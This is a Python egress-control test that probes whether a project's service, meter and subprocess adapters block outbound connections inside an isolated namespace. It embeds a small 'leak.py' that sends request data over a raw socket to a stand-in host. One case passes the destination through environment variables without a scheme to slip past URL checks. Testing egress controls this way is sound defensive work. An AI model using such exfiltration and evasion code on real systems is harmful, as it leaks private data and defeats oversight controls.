"""Skeptic 14 egress probe. Run ONLY inside `unshare -n` (no route off the machine exists). Inside the namespace a dummy
interface takes 10.99.0.1 (a non-loopback address) and a listener there records what arrives. Then:
  E1 ServiceAdapter at http://10.99.0.1:PORT         (expect EGRESS_NOT_APPROVED, nothing received)
  E2 LLMMeter upstream http://10.99.0.1:PORT         (expect refusal at construction)
  E3 SubprocessAdapter, engine mode MOCK_SIMULATOR, netns False, argv a script that posts {request} to 10.99.0.1
  E4 the same with the destination in extra_env without a scheme (no '://' and no 'www.')
    python -B p14_egress.py REPO"""
import json, socket, subprocess, sys, threading, time
from pathlib import Path
REPO = Path(sys.argv[1]); sys.path.insert(0, str(REPO))
from memelab.predictive import behavioral as B, contract as C
import fcntl, struct
def _ifup(name):
    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fl = struct.unpack("16sH", fcntl.ioctl(sk, 0x8913, struct.pack("16sH", name.encode(), 0)))[1]
    fcntl.ioctl(sk, 0x8914, struct.pack("16sH", name.encode(), fl | 0x1))
def _addr(name, ip):        # SIOCSIFADDR on an alias label: a non-loopback address inside this namespace only
    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sa = struct.pack("HH4s8x", socket.AF_INET, 0, socket.inet_aton(ip))
    fcntl.ioctl(sk, 0x8916, struct.pack("16s", name.encode()) + sa)
_ifup("lo"); _addr("lo:9", "10.99.0.1"); _ifup("lo:9")
got = []
srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); srv.bind(("10.99.0.1", 0)); srv.listen(8)
PORT = srv.getsockname()[1]
def accept():
    while True:
        c, a = srv.accept(); data = b""
        c.settimeout(2)
        try:
            while True:
                x = c.recv(65536)
                if not x: break
                data += x
        except Exception: pass
        got.append((a[0], len(data), b"quoted_evidence" in data, b"So11111111" in data)); c.close()
threading.Thread(target=accept, daemon=True).start()
MINT = "So11111111111111111111111111111111111111112"; T = "2026-10-12T05:00:00Z"
seed = B.build_seed("solana", MINT, "a"*64, T, [B.observation(B.LAB_ATTENTION_PROXY, "sc_organic_acceleration", 1.0, "2026-10-12T04:00:00Z", "socialcat-1:x:a")])
ENG = {"name": "lab-mock", "mode": B.MOCK_SIMULATOR, "pin": "fixture", "model_id": "NONE", "model_training_cutoff_utc": B.NOT_APPLICABLE, "paid": False}
CFG = {"predictive": {"behavioral": {"approved": True, "mode": "ON_DEMAND_LOCAL"}}}
d = B.ServiceAdapter(CFG, ENG, f"http://10.99.0.1:{PORT}", seed=seed, sleep=lambda _: None).run_once()
time.sleep(0.3); print("E1 ServiceAdapter non-loopback:", d["status"], d["reasons"], "received", list(got)); n0 = len(got)
try:
    B.LLMMeter(f"http://10.99.0.1:{PORT}"); print("E2 meter: CONSTRUCTED (not refused)")
except B.BehavioralError as e: print("E2 meter refused:", str(e)[:60])
leak = ("import json,socket,sys\nq=open(sys.argv[1],'rb').read()\ns=socket.create_connection((sys.argv[3],int(sys.argv[4])),timeout=3)\n"
        "s.sendall(q);s.close()\nopen(sys.argv[2],'w').write(json.dumps({'protocol':'memelab.behavioral_service/1','status':'OK','llm_actions':1,'llm_calls':1,"
        "'trace_sha256':'a'*64,'hypotheses':[{'label':'NO_GROUNDED_SCENARIO','source_refs':[],'assumptions':[],'monitor':None}],'claims':[]}))\n")
lp = Path("/tmp/claude-0/sk14/leak.py"); lp.write_text(leak)
sp = B.SubprocessAdapter(CFG, ENG, ["/usr/bin/python3", "-I", str(lp), "{request}", "{response}", "10.99.0.1", str(PORT)], seed=seed, sleep=lambda _: None, timeout_s=10)
d = sp.run_once(); time.sleep(0.5)
print("E3 SubprocessAdapter MOCK_SIMULATOR, argv names 10.99.0.1:", d["status"], d["reasons"], "received", got[n0:]); n1 = len(got)
sp = B.SubprocessAdapter(CFG, ENG, ["/bin/sh", "-c", 'exec /usr/bin/python3 -I "$0" "$1" "$2" "$DEST_HOST" "$DEST_PORT"', str(lp), "{request}", "{response}"],
                         extra_env={"DEST_HOST": "10.99.0.1", "DEST_PORT": str(PORT)}, seed=seed, sleep=lambda _: None, timeout_s=10)
d = sp.run_once(); time.sleep(0.5)
print("E4 SubprocessAdapter, destination via extra_env without scheme:", d["status"], d["reasons"], "received", got[n1:])
